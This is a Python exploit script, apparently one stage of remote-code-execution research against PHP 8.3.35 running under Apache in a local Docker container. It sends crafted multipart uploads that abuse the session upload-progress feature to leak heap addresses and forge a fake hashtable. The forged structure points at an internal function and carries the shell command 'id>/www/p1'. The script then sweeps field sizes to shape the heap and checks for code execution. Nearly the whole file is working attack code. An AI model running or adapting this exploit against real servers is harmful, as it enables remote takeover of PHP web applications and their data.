"""8.3.35 stage-3: try different big-field sizes to shift heap layout.
The carrier lands at R+0xfd8 with the default 12MB big field.
Try 8/10/11/12/13/14/16/20/24 MB and check if the carrier lands at R.
Signal: ref@R has rc=1 typ=0x1A val_lo7=htdata_lo7 (CARRIER ON).
"""
import subprocess, sys, time, struct, os, importlib.util
from collections import Counter

BASE = r"C:\Users\likat\p2s52704"
C = "p2s8335"
PORT = 18112
PSG_OFF = 0x10432a0
HSV_OFF = 0x150
ZIF = 0x3ac080
HTDATA_OFF = 0x690d8

spec = importlib.util.spec_from_file_location("exploit", os.path.join(BASE, "exploit.py"))
E = importlib.util.module_from_spec(spec)
spec.loader.exec_module(E)

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def get_worker():
    r = sh(f'docker exec {C} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
    pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
    wpid = pids[-1]
    r = sh(f'docker exec {C} sh -c "grep libphp /proc/{wpid}/maps 2>/dev/null | head -1"')
    B = int(r.stdout.strip().split("-")[0], 16)
    return wpid, B

def read_mem(wpid, addr, size):
    r = subprocess.run(
        f'docker exec {C} sh -c "dd if=/proc/{wpid}/mem bs=1 skip={addr} count={size} 2>/dev/null"',
        shell=True, capture_output=True
    )
    return r.stdout

def rotate():
    r = sh(f'docker exec {C} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
    pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
    if len(pids) >= 2:
        sh(f'docker exec {C} kill -9 {pids[-1]}')
    time.sleep(1.0)
    for _ in range(30):
        r = sh(f'docker exec {C} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
        if len(r.stdout.strip().splitlines()) >= 2:
            return
        time.sleep(0.5)

def trial(mb):
    rotate()
    wpid, B = get_worker()
    ps_hsv = B + PSG_OFF + HSV_OFF

    t = E.Target(f"http://127.0.0.1:{PORT}/index.php", timeout=120, verbose=False)

    # Request A (OOM + setup)
    parts_a = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts_a += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (mb * 1024 * 1024)},
    ]
    r1 = t.post(E.build_multipart(parts_a, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.2)

    # stage-1 leak
    parts_l = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts_l.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts_l.append({"name": "1999", "data": bytes(forge)})
    r2 = t.post(E.build_multipart(parts_l, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=120)
    raw = E.parse_cookie(r2)
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    chunk_base = c.most_common(1)[0][0] if c else 0
    if not chunk_base:
        print(f"  big={mb}MB: STAGE1 FAILED (no chunk base)", flush=True)
        return False

    htdata = chunk_base + HTDATA_OFF
    zif_abs = B + ZIF

    # Request B (write)
    ht = bytearray(b"\x00" * 167)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif_abs)
    Eo = 0x20
    struct.pack_into("<Q", ht, Eo+0, 0); struct.pack_into("<Q", ht, Eo+8, 0)
    struct.pack_into("<Q", ht, Eo+0x10, zif_abs); struct.pack_into("<Q", ht, Eo+0x18, 0)
    struct.pack_into("<Q", ht, Eo+0x20, 0)
    struct.pack_into("<I", ht, Eo+0x28, 0); struct.pack_into("<I", ht, Eo+0x2C, 1)
    struct.pack_into("<Q", ht, Eo+0x30, 0); struct.pack_into("<Q", ht, Eo+0x38, 0)
    struct.pack_into("<I", ht, Eo+0x40, 0)
    struct.pack_into("<Q", ht, Eo+0x50, htdata + 0x80)
    struct.pack_into("<I", ht, Eo+0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    cmd = b"id>/www/p1"
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98+len(cmd)] = cmd
    ht[0x98+len(cmd)] = 0

    carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
    parts_b = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(2):
        parts_b.append({"name": f"f{i:02d}", "data": b"F" * 15})
    parts_b.append({"name": "g00", "data": carrier})
    for i in range(15):
        parts_b.append({"name": f"a{i:030d}"[:31], "data": ht})
    t.post(E.build_multipart(parts_b, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30)
    time.sleep(0.3)

    # Check R
    data = read_mem(wpid, ps_hsv, 16)
    R = struct.unpack("<Q", data[:8])[0] if len(data) >= 8 else 0
    ref = read_mem(wpid, R, 16) if R else b""
    if len(ref) >= 16:
        rc = struct.unpack("<I", ref[0:4])[0]
        typ = struct.unpack("<I", ref[4:8])[0]
        valv = struct.unpack("<Q", ref[8:16])[0]
        valv_lo7 = valv & 0x00FFFFFFFFFFFFFF
        ht_lo7 = htdata & 0x00FFFFFFFFFFFFFF
        hit = (rc == 1 and typ == 0x1A and valv_lo7 == ht_lo7)
        # Check proof
        pr = sh(f'docker exec {C} cat /www/p1 2>/dev/null')
        proof = pr.stdout.strip()
        tag = " *** RCE ***" if proof else (" *** CARRIER ON ***" if hit else "")
        print(f"  big={mb}MB: R=0x{R:x} rc={rc} typ=0x{typ:x} valv_lo7=0x{valv_lo7:x} (want 0x{ht_lo7:x}){tag}", flush=True)
        if proof:
            print(f"    PROOF: {proof}", flush=True)
            return True
        return False
    else:
        print(f"  big={mb}MB: R=0x{R:x} (no ref)", flush=True)
        return False

print("=== 8.3.35 stage-3: big-field size sweep ===", flush=True)
for mb in [8, 10, 11, 12, 13, 14, 16, 20, 24]:
    ok = trial(mb)
    if ok:
        print(f"\n*** RCE at big={mb}MB ***", flush=True)
        break
    time.sleep(0.5)
print("=== done ===", flush=True)
